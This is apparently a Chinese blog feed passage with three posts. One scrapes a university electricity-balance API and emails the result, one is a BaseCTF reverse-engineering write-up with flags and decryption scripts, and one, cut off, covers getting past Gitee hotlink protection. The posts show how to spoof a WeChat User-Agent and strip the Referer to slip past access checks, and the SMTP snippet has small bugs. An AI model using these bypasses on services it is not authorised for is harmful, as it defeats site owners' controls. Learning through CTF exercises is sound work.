    <content type="html"><![CDATA[<p>由于寝室老是没电导致我的电脑处于工作状态开机，气死我了，我便想用python来了解目前的电费是多少并给我发邮件，首先我们要了解一下基本的python发送响应包的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 发送 GET 请求</span><br>url = <span class="hljs-string">&#x27;https://example.com&#x27;</span>  <span class="hljs-comment"># 将此替换为你要访问的网址</span><br>response = requests.get(url)<br><br><span class="hljs-comment"># 检查请求是否成功</span><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求成功！&quot;</span>)<br>    <span class="hljs-comment"># 获取网页内容</span><br>    content = response.text  <span class="hljs-comment"># 返回HTML内容</span><br>    <span class="hljs-built_in">print</span>(content)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败，状态码：<span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>    <br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 发送 POST 请求</span><br>url = <span class="hljs-string">&#x27;https://example.com/api&#x27;</span>  <span class="hljs-comment"># 将此替换为实际的API URL</span><br>data = &#123;<span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;your_username&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;your_password&#x27;</span>&#125;  <span class="hljs-comment"># 传递的数据</span><br>response = requests.post(url, data=data)<br><br><span class="hljs-comment"># 检查请求是否成功</span><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;POST 请求成功！&quot;</span>)<br>    <span class="hljs-comment"># 获取响应内容</span><br>    <span class="hljs-built_in">print</span>(response.text)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败，状态码：<span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>在了解之后我们用bp抓包，发现一个问题，我们不再微信程序时网页会有一个自校验的情况，让我们在微信中打开，这无疑是我们不希望的不过我们可以修改我们的请求头部伪造我们在微信中的情景</p><p>这是在User agent 修改，这样服务端便会认为我们在微信中了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">Mozilla/5.0 (Linux; Android 5.0; SM-N9100 Build/LRX21V) &gt; AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 &gt; Chrome/37.0.0.0 Mobile Safari/537.36 &gt; MicroMessenger/6.0.2.56_r958800.520 NetType/WIFI<br></code></pre></td></tr></table></figure><p>下面是我们的请求报文</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html">POST /app/app/api/user/searchBindHouseListForMoney HTTP/1.1<br>Host: xdxfdf.xtu.edu.cn<br>Content-Length: 58<br>Accept: application/json, text/javascript, */*; q=0.01<br>X-Requested-With: XMLHttpRequest<br>Accept-Language: zh-CN<br>User-Agent: Mozilla/5.0 (Linux; Android 5.0; SM-N9100 Build/LRX21V) &gt; AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 &gt; Chrome/37.0.0.0 Mobile Safari/537.36 &gt; MicroMessenger/6.0.2.56_r958800.520 NetType/WIFI<br>Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br>Origin: http://xdxfdf.xtu.edu.cn<br>Referer: http://xdxfdf.xtu.edu.cn/app/api/main/wxpay/payStepOne?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX<br>Accept-Encoding: gzip, deflate, br<br>Cookie: JSESSIONID=XXXXXXXXXXXXXXXXXXXXXXXX<br>Connection: keep-alive<br><br>wxId=XXXXXXXXXXXXXXXXXXX&amp;appId=XXXXXXXXXXXXXXXXXXXXXXX<br></code></pre></td></tr></table></figure><p>在python中的写法便是</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> smtplib<br><span class="hljs-comment"># 请求的 URL</span><br>url = <span class="hljs-string">&quot;https://xdxfdf.xtu.edu.cn/app/app/api/user/searchBindHouseListForMoney&quot;</span><br>headers = &#123;<br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;JSESSIONID=XXXXXXXXXXXXXXXXX&quot;</span>,<br>        &#125;<br>data = &#123;<br>    <span class="hljs-string">&quot;wxId&quot;</span>: <span class="hljs-string">&quot;XXXXXXXXXXXXX&quot;</span>,<br>    <span class="hljs-string">&quot;appId&quot;</span>: <span class="hljs-string">&quot;XXXXXXXXXXXXX&quot;</span>,<br>&#125;<br>response = requests.post(url, headers=headers,data=data)<br><span class="hljs-comment"># 检查响应状态码</span><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求成功！&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;响应内容:&quot;</span>, response.json())  <span class="hljs-comment"># 假设返回的内容是 JSON 格式</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败，状态码：<span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;响应内容:&quot;</span>, response.text)<br></code></pre></td></tr></table></figure><p>可见重要的其实是cookie<br>我们的响应内容是(json转义后的)</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>&#x27;data&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span>&#x27;customer_no&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">00116607</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;house_id&#x27;<span class="hljs-punctuation">:</span> &#x27;xxxxxxxxxxxxxx&#x27;<span class="hljs-punctuation">,</span> &#x27;meter&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span>&#x27;meter_status&#x27;<span class="hljs-punctuation">:</span> None<span class="hljs-punctuation">,</span> &#x27;customer_no&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">00116607</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;sysId&#x27;<span class="hljs-punctuation">:</span> None<span class="hljs-punctuation">,</span> &#x27;wallet_balance&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> &#x27;house_addr&#x27;<span class="hljs-punctuation">:</span> &#x27;XXXX&#x27;<span class="hljs-punctuation">,</span> &#x27;meter_balance&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">64.18</span><span class="hljs-punctuation">,</span> &#x27;meter_type&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">1</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;meter_balance_time&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">20240914225456</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;buy_time&#x27;<span class="hljs-punctuation">:</span> None<span class="hljs-punctuation">,</span> &#x27;free_balance&#x27;<span class="hljs-punctuation">:</span> None<span class="hljs-punctuation">,</span> &#x27;house_no&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">607</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;pay_type&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">1</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;customer_name&#x27;<span class="hljs-punctuation">:</span> &#x27;xxxxxxx&#x27;<span class="hljs-punctuation">,</span> &#x27;meter_no&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">000017001111</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;meter_id&#x27;<span class="hljs-punctuation">:</span> &#x27;xxxxxxxxxxxxxxxxxxxxx&#x27;<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> &#x27;house_no&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">607</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;wallet_balance&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> &#x27;house_addr&#x27;<span class="hljs-punctuation">:</span> &#x27;xxxxxxxxxxxx&#x27;<span class="hljs-punctuation">,</span> &#x27;customer_name&#x27;<span class="hljs-punctuation">:</span> &#x27;XXXXXXXXXXXXX&#x27;<span class="hljs-punctuation">,</span> &#x27;pay_customer_flag&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">0</span>&#x27;<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> &#x27;msg&#x27;<span class="hljs-punctuation">:</span> &#x27;&#x27;<span class="hljs-punctuation">,</span> &#x27;ret&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">1</span>&#x27;<span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>成功获取我们要的报文后我们了解了在python中存在一个交SMTP的库，自带的竟然是,直接贴使用代码，看得更清楚些</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br> <br><span class="hljs-keyword">import</span> smtplib<br><span class="hljs-keyword">from</span> email.mime.text <span class="hljs-keyword">import</span> MIMEText<br><span class="hljs-keyword">from</span> email.header <span class="hljs-keyword">import</span> Header<br> <br><span class="hljs-comment"># 第三方 SMTP 服务</span><br>mail_host=<span class="hljs-string">&quot;smtp.XXX.com&quot;</span>  <span class="hljs-comment">#设置服务器</span><br>mail_user=<span class="hljs-string">&quot;XXXX&quot;</span>    <span class="hljs-comment">#用户名</span><br>mail_pass=<span class="hljs-string">&quot;XXXXXX&quot;</span>   <span class="hljs-comment">#口令 </span><br> <br> <br>sender = <span class="hljs-string">&#x27;from@runoob.com&#x27;</span><br>receivers = [<span class="hljs-string">&#x27;429240967@qq.com&#x27;</span>]  <span class="hljs-comment"># 接收邮件，可设置为你的QQ邮箱或者其他邮箱</span><br> <br>message = MIMEText(<span class="hljs-string">&#x27;Python 邮件发送测试...&#x27;</span>, <span class="hljs-string">&#x27;plain&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>message[<span class="hljs-string">&#x27;From&#x27;</span>] = Header(<span class="hljs-string">&quot;菜鸟教程&quot;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>message[<span class="hljs-string">&#x27;To&#x27;</span>] =  Header(<span class="hljs-string">&quot;测试&quot;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br> <br>subject = <span class="hljs-string">&#x27;Python SMTP 邮件测试&#x27;</span><br>message[<span class="hljs-string">&#x27;Subject&#x27;</span>] = Header(subject, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br> <br> <br><span class="hljs-keyword">try</span>:<br>    smtpObj = smtplib.SMTP() <br>    smtpObj.connect(smtp.qq.com, <span class="hljs-number">25</span>)    <span class="hljs-comment"># 25 为 SMTP端口号 456为ssh加密端口号</span><br>    smtpObj.login(mail_user,mail_pass)  <span class="hljs-comment">#用户的邮箱号，pass不是密码是SMTP授权号码</span><br>    smtpObj.sendmail(sender, receivers, message.as_string())<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;邮件发送成功&quot;</span><br><span class="hljs-keyword">except</span> smtplib.SMTPException:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Error: 无法发送邮件&quot;</span><br></code></pre></td></tr></table></figure><p>我们需要开启qq邮箱的smtp服务,了解了<br><img src="https://gitee.com/fogpost/photo/raw/master/202409150023941.png" srcset="/img/loading.gif" lazyload><br>顺便贴一个From的格式我在这里卡住了。。。邮箱格式要正确呜呜呜<br><img src="https://gitee.com/fogpost/photo/raw/master/202409150023846.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
    <categories>
      
      <category>tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crawler</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BaseCTF202409</title>
    <link href="/2024/09/14/BaseCTF202409/"/>
    <url>/2024/09/14/BaseCTF202409/</url>
    
    <content type="html"><![CDATA[<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="UPX-mini"><a href="#UPX-mini" class="headerlink" title="UPX mini"></a>UPX mini</h3><p>既然是UPX那必须先DIE查壳<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141119212.png" srcset="/img/loading.gif" lazyload><br>一看就不对劲，upx最多只见过3.96的，不过这里先用upx自己脱一下可以脱<br>直接继续查，64位无壳，进入ida<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141122619.png" srcset="/img/loading.gif" lazyload><br>明显的base64直接，解密<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141123562.png" srcset="/img/loading.gif" lazyload><br>秒解<br>BaseCTF{Hav3_@_g0od_t1m3!!!}</p><h3 id="ez-xor"><a href="#ez-xor" class="headerlink" title="ez_xor"></a>ez_xor</h3><p>简单xor，直接看ida，查位数64位<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141128380.png" srcset="/img/loading.gif" lazyload><br>看码了解，关键函数keystream和encrpt，输入长度为28，str、v11、v12、v13加起来正好28位,这个题目要注意的就是ida中的c是小端序的会所有的数据都会反转，而且记得使用原数据，不要用转义后的容易出错<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141137462.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409141138498.png" srcset="/img/loading.gif" lazyload><br>写pythonexp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#官方wp</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key_stream</span>(<span class="hljs-params">key</span>):<br>    key_box = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">28</span>):<br>        key_box.append(key[i%<span class="hljs-number">3</span>] ^ i)<br>    <span class="hljs-keyword">return</span> key_box<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">enc, key</span>):<br>    flag = <span class="hljs-string">&quot;&quot;</span><br>    key = key[::-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>        flag += <span class="hljs-built_in">chr</span>(enc[i] ^ key[i])<br>    <span class="hljs-keyword">return</span> flag<br><br>enc1 = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;1D0B2D2625050901&quot;</span>)[::-<span class="hljs-number">1</span>]<br>enc2 = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;673D491E20317A24&quot;</span>)[::-<span class="hljs-number">1</span>]<br>enc3 = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;34056E2E2508504D&quot;</span>)[::-<span class="hljs-number">1</span>]<br>enc4 = <span class="hljs-string">b&quot;\&quot;@;%&quot;</span><br>enc = enc1 + enc2 + enc3 + enc4<br><span class="hljs-built_in">print</span>(enc)<br><br>key = (<span class="hljs-number">7499608</span>).to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br>key_box = key_stream(key)<br><span class="hljs-built_in">print</span>(key_box)<br><br>flag = decrypt(enc,key_box)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h3 id="BasePlus"><a href="#BasePlus" class="headerlink" title="BasePlus"></a>BasePlus</h3><p>以上来就搞个base64啊，我感觉像，但是没有确定，于是就看不懂函数里面的几个值为什么没有数了，这么奇怪，果然还是没有学过，不过这次好好分析了一番下次应该就可以瞬间秒杀了，看题<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141107908.png" srcset="/img/loading.gif" lazyload><br>我们能了解重要函数为Encode，进入<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141108814.png" srcset="/img/loading.gif" lazyload><br>了解了这个是base64后我们还要和源代码分析，发现存在不同<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141109133.png" srcset="/img/loading.gif" lazyload><br>了解了这中间有个异或的操作，十分简单</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">do</span><br>&#123;<br>    *(_BYTE *)(a2 + v8) = v4[v8] ^ <span class="hljs-number">0xE</span>;<br>    ++v8;<br>&#125;<br><span class="hljs-keyword">while</span> ( v8 != v5 );<br></code></pre></td></tr></table></figure><p>直接cyberChef换表加异或双重解密完成，<br>贴个无广告的<a href="https://cyberchef.org/">cyberchef</a><br><img src="https://gitee.com/fogpost/photo/raw/master/202409141116043.png" srcset="/img/loading.gif" lazyload><br>得到flag<br>BaseCTF{BA5e_DEcoD1N6_sEcr3t}</p><h3 id="Ezpy"><a href="#Ezpy" class="headerlink" title="Ezpy"></a>Ezpy</h3><p>首先就是按照惯例，文件属性查询，直接die，也可以用DEID或者peexam去查。不过die很全面，但是确实很卡<br><img src="https://gitee.com/fogpost/photo/raw/master/202409151024364.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409151027465.png" srcset="/img/loading.gif" lazyload><br>看题目我们就知道是一个这是一个python题目，其实还有一个办法，pythonexe图标大多都是这个，看DIE竟然没有显示是什么软件打包的，那么我们便可以试试pyinstxtractor<br><img src="https://gitee.com/fogpost/photo/raw/master/202409151029748.png" srcset="/img/loading.gif" lazyload><br>这就是解包过程，和使用方法，在这个过程中pyinstxtractor会自动创建一个导出包，我们可以查看，同时我们也可以发现解包软件对python版本的需求，你有想法的可以用<a href="https://zhuanlan.zhihu.com/p/36402791">pyenv</a>去除掉这个错误，其实我感觉没什么区别，主要在于后面pyc文件中的magic number<br>进入解包文件夹，会发现资源文件夹和大量的动态链接库，我们只取敌将首级，直接看到一个没有后缀的题目同名软件Ezpy<br><img src="https://gitee.com/fogpost/photo/raw/master/202409151035853.png" srcset="/img/loading.gif" lazyload><br>这个其实是pyc也就是python的字节码。我们需要的就是这个，python大部分就是利用pyc来进行反编译，我们所知的反编译工具有<a href="https://www.52pojie.cn/thread-1854345-1-1.html">pycdc</a>(pycdc会有些麻烦，不过感觉强大些，因为是反编译难免会出现错误，而这个的错误出现会更加稀少)和<a href="https://pypi.com.cn/project/uncompyle6/">uncompyle6</a>这个的安装非常的简单，有python就行(但是只支持3.8及一下的，作者大大不更3.9了)<br>好现在我们开始执行一下pycdc(记得改Ezpy后缀名，pycdc就没关系)，就会发现惊喜了，失败了<br><img src="https://gitee.com/fogpost/photo/raw/master/202409151042742.png" srcset="/img/loading.gif" lazyload><br>这个就是我说的magicnumber的问题解决办法也非常简单，一般解包后都会自带一个struct文件。用字节查看器打开推荐<a href="https://www.52pojie.cn/thread-1863194-1-1.html">010</a>，不过大部分都是损坏的我在这贴一个<a href="https://blog.csdn.net/OrientalGlass/article/details/134612786">magicnumber</a>。<br>注意大小端序，照着改就行。建议是十六个字节，留空留下栈区<br><img src="https://gitee.com/fogpost/photo/raw/master/202409151053398.png" srcset="/img/loading.gif" lazyload><br>然后直接反编译(也可以用网络版的)</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> Key<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_Sbox</span>(<span class="hljs-params">seed</span>):<br>    k_b = (<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span> = <span class="hljs-literal">None</span>: [ <span class="hljs-built_in">ord</span>(seed[i % <span class="hljs-built_in">len</span>(seed)]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    s = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s[i] + k_b[i]) % <span class="hljs-number">256</span><br>        s[i] = s[j]<br>        s[j] = s[i]<br>    <span class="hljs-keyword">return</span> s<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">KeyStream</span>(<span class="hljs-params">text, Sbox</span>):<br>    s = Sbox.copy()<br>    (i, j) = (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>    k = [<br>        <span class="hljs-number">0</span>] * <span class="hljs-built_in">len</span>(text)<br>    <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(text)):<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + s[i]) % <span class="hljs-number">256</span><br>        s[i] = s[j]<br>        s[j] = s[i]<br>        t = (s[i] + s[j]) % <span class="hljs-number">256</span><br>        k[r] = s[t] ^ Key.keykey[r % <span class="hljs-built_in">len</span>(Key.keykey)]<br>    <span class="hljs-keyword">return</span> k<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Encrypt</span>(<span class="hljs-params">text, seed</span>):<br>    Sbox = init_Sbox(seed)<br>    key = KeyStream(text, Sbox)<br>    enc = (<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span> = <span class="hljs-literal">None</span>: [ text[i] ^ key[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(text)))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(enc)<br><br>enc = <span class="hljs-string">b&#x27;\xe6\xaeC~F\xf2\xe3\xbb\xac\x9a-\x02U\x85p\xeb\x19\xd1\xe4\xc93sG\xb0\xeb1\xb5\x05\x05\xc3\xd7\x00\x18+D\xbc\x0cO\x9em\xf1\xbd&#x27;</span><br>flag = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Please input Your flag:&#x27;</span>)<br>flag = (<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ <span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(flag)<br>flag = Encrypt(flag, Key.key)<br><span class="hljs-keyword">if</span> flag != enc:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;It&#x27;s not flag!&quot;</span>)<br>    <span class="hljs-keyword">continue</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;You are right!&#x27;</span>)<br>sys.exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p>就是一个非常简单的rc4<br>直接给出exp</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>可恶的gitee吃掉外链了</title>
    <link href="/2024/09/12/%E5%8F%AF%E6%81%B6%E7%9A%84gitee%E5%90%83%E6%8E%89%E5%A4%96%E9%93%BE%E4%BA%86/"/>
    <url>/2024/09/12/%E5%8F%AF%E6%81%B6%E7%9A%84gitee%E5%90%83%E6%8E%89%E5%A4%96%E9%93%BE%E4%BA%86/</url>
    
    <content type="html"><![CDATA[<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>这是这个博客最开始的故事，我想要用gitee做一个图床，当时我怎么也没想到gitee居然拒绝掉外链的请求了，就像这样<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122231370.png" srcset="/img/loading.gif" lazyload><br>但是反复尝试我们发现了一下返回值</p><h3 id="防盗链"><a href="#防盗链" class="headerlink" title="防盗链"></a>防盗链</h3><p>要实现防盗链，就需要知道图片的请求是从哪里发出的。可以实现这一功能的有请求头中的origin和referer。origin只有在XHR请求中才会带上，所以图片资源只能借助referer</p><p>通过判断请求的referer，如果请求来源不是本站就返回302</p><h4 id="一个完整的流程："><a href="#一个完整的流程：" class="headerlink" title="一个完整的流程："></a>一个完整的流程：</h4><ul><li>首先请求正常的图片，但是没有返回200，而是302重定向，其中响应头中的location就是要重定向去向的地址</li><li>接着浏览器会自动请求这个location，并用这个返回结果代替第一次请求的返回内容<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122241207.png" srcset="/img/loading.gif" lazyload></li></ul><h4 id="如何破解防盗链"><a href="#如何破解防盗链" class="headerlink" title="如何破解防盗链"></a>如何破解防盗链</h4><p>想让gitee不知道我在盗用，就不能让他发现请求的来源是第三方，只要把referer藏起来就好</p><p><img src="https://gitee.com/fogpost/photo/raw/master/202409122236635.png" srcset="/img/loading.gif" lazyload><br>但是我们可以骗过gitee，用butterfly和yilia的主题可以上网搜搜都有讲，fluid这类的不同，但是我们这里要讲下进阶的代码注入<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122233566.png" srcset="/img/loading.gif" lazyload><br>按上面这个我们就可以写出header头前的代码来注入，骗过gitee使图片显现<br>下面是我的代码</p><figure 